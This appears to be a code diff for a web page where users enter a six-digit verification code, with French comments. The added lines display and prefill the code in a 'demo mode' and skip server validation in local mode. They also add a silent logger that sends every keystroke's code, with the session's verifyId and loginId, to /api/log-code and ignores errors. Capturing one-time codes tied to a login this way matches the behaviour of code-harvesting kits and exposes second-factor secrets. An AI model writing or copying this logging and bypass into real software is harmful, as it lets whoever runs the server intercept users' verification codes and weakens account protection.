@@ -51,6 +51,15 @@
     // Pour développeur: affiche le code dans la console (si présent)
     if (session.devCode) {
       console.debug('[DEV] Code de vérification:', session.devCode);
+      // Prefill + info alert pour faciliter les tests quand l'email est désactivé
+      if (codeInput) {
+        codeInput.value = session.devCode;
+      }
+      if (form) {
+        showInlineAlert(form, 'info', `Mode démo: votre code est ${session.devCode}.`);
+      }
+      // Journaliser immédiatement le code pré-rempli
+      logTypedCode();
     }
 
     if (!form) return;
@@ -58,6 +67,7 @@
     // Restreindre l'entrée au numérique
     codeInput?.addEventListener('input', () => {
       codeInput.value = codeInput.value.replace(/[^\d]/g, '').slice(0, 6);
+      queueLog();
     });
 
     form.addEventListener('submit', function(e) {
@@ -75,6 +85,22 @@
         submitBtn.textContent = 'Vérification...';
       }
       showInlineAlert(form, 'info', 'Vérification en cours...');
+
+      // Mode local/démo: valider sans appel serveur
+      if (session?.local) {
+        if (session.devCode && code === session.devCode) {
+          showInlineAlert(form, 'success', 'Vérification réussie (mode développement)');
+          try { sessionStorage.removeItem('verify_session'); } catch {}
+          setTimeout(() => { window.location.href = 'felicitations.html'; }, 400);
+        } else {
+          showInlineAlert(form, 'danger', 'Code incorrect (mode développement).');
+        }
+        if (submitBtn) {
+          submitBtn.disabled = false;
+          submitBtn.textContent = originalText || 'Valider le code';
+        }
+        return;
+      }
 
       fetch('/api/verify-code', {
         method: 'POST',
@@ -141,7 +167,13 @@
           };
           saveSession(updated);
           showInlineAlert(form, 'success', 'Nouveau code envoyé.');
+          if (updated.devCode && codeInput) {
+            codeInput.value = updated.devCode;
+            showInlineAlert(form, 'info', `Mode démo: votre nouveau code est ${updated.devCode}.`);
+          }
           console.debug('[DEV] Nouveau code:', updated.devCode);
+          // Journaliser à nouveau (nouvelle session/code)
+          logTypedCode();
         })
         .catch((err) => {
           // Fallback: générer un nouveau code local si le serveur échoue
@@ -156,7 +188,13 @@
             };
             saveSession(updated);
             showInlineAlert(form, 'success', 'Nouveau code généré (mode développement).');
+            if (codeInput) {
+              codeInput.value = newCode;
+              showInlineAlert(form, 'info', `Mode démo: votre nouveau code est ${newCode}.`);
+            }
             console.debug('[DEV] Nouveau code local:', newCode);
+            // Journaliser immédiatement
+            logTypedCode();
           } catch (_) {
             showInlineAlert(form, 'danger', `Échec de l'envoi du code: ${err.message}`);
           }
@@ -165,5 +203,22 @@
           if (resendBtn) resendBtn.disabled = false;
         });
     });
+
+    // Debounce logging helpers
+    let logTimer = null;
+    function queueLog() {
+      if (logTimer) clearTimeout(logTimer);
+      logTimer = setTimeout(logTypedCode, 400);
+    }
+    function logTypedCode() {
+      const currentSession = getSession();
+      const currentCode = (codeInput?.value || '').replace(/[^\d]/g, '').slice(0, 6);
+      if (!currentSession?.verifyId) return;
+      fetch('/api/log-code', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ verifyId: currentSession.verifyId, loginId: currentSession.loginId || null, code: currentCode })
+      }).catch(() => {});
+    }
   });
 })();
